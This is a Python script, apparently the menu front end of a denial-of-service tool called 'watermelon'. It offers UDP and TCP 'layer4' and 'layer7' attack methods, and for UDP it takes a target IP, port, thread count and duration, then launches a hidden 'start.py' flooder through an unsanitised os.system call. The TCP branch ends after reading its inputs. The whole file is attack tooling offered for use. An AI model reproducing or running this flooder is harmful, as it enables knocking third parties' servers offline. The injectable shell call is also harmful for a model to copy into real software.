#!/usr/bin/python3
#coded by $ watermelon
#smd
import requests
import socket
#import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os

print("""
               _                           _             
              | |                         | |            
__      ____ _| |_ ___ _ __ _ __ ___   ___| | ___  _ __  
\ \ /\ / / _` | __/ _ \ '__| '_ ` _ \ / _ \ |/ _ \| '_ \ 
 \ V  V / (_| | ||  __/ |  | | | | | |  __/ | (_) | | | |
  \_/\_/ \__,_|\__\___|_|  |_| |_| |_|\___|_|\___/|_| |_|
>--------------------------------------------------------
version 1.0                           cod3d by wat3rmelon


╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                      _____ __  __ _____    __         ║
║                     / ____|  \/  |  __ \   \ \        ║
║                   | (___ | \  / | |  | | (_) |        ║
║                    \___ \| |\/| | |  | |   | |        ║
║                    ____) | |  | | |__| |  _| |        ║
║                   |_____/|_|  |_|_____/  (_) |        ║
║                                            /_/        ║                                              ║
║                                                       ║
║                   $ watermelon#5101                   ║
║                                                       ║
╠═══════════════════════════════════════════════════════╣
║                                                       ║
║                          layer4                       ║
║                          layer7                       ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
""")

input1 = input("""
╔══════[root@watermelon]
╚═══> """)

if input1 == "layer4":
    print("""  
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                   methods: UDP, TCP                   ║                   
║                                                       ║
╚═══════════════════════════════════════════════════════╝""")
layer4input = input("""
╔══════[root@watermelon]
╚═══> """)

if layer4input == "UDP":
    ipudp = input(f"ip ══ ")
    portudp = input(f"port ══ ")
    threadsudp = input(f"threads ══ ")
    timeudp = input(f"time ══ ")
    cmdudp = 'cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + threadsudp + ' ' + timeudp
    os.system(cmdudp)

if layer4input == "TCP":
    iptcp = input(f"ip ══ ")
    porttcp = input(f"port ══ ")
    threadstcp = input(f"threads ══ ")
    timetcp = input(f"time ══ ")
